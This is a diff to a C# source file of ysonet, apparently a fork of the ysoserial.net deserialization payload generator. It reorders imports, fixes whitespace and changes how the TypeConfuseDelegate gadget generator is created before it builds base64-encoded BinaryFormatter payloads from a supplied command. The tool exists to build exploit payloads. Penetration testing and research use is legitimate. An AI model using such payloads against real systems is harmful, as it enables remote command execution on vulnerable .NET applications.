@@ -1,9 +1,8 @@
-﻿using System;
+﻿using NDesk.Options;
+using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Text.RegularExpressions;
-using NDesk.Options;
 using ysonet.Generators;
 using ysonet.Helpers;
 
@@ -167,7 +166,7 @@ Exemplary usage:
         {
 
             String gadget = "";
-            
+
             if (formatter.ToLower() == "json.net")
             {
                 gadget = @"
@@ -242,13 +241,18 @@ Exemplary usage:
 
             String gadget = "";
 
-
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = input;
 
-            IGenerator generator = new TypeConfuseDelegateGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            // Use GadgetHelper to create TypeConfuseDelegateGenerator instance
+            IGenerator generator = GadgetHelper.CreateGadgetInstance("TypeConfuseDelegate");
+            if (generator == null)
+            {
+                Console.WriteLine("TypeConfuseDelegateGenerator not supported!");
+                Environment.Exit(-1);
+            }
 
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
@@ -361,7 +365,7 @@ Exemplary usage:
                 Console.WriteLine("Provided file " + input + " does not exist");
                 Environment.Exit(-1);
             }
-            
+
             String gadget = "";
 
 
@@ -469,7 +473,7 @@ Exemplary usage:
         {
             //something more accurate should be developed in the future, it's a quick regex-based thing that works for current gadgets
 
-            payload = Regex.Replace(payload, "Version=[0-9][0-9.]*,?\\s?","");
+            payload = Regex.Replace(payload, "Version=[0-9][0-9.]*,?\\s?", "");
             payload = Regex.Replace(payload, "Culture=neutral,?\\s?", "");
             payload = Regex.Replace(payload, "PublicKeyToken=[a-fA-F0-9]{16},?\\s?", "");
             payload = Regex.Replace(payload, ",\\s'", "'");
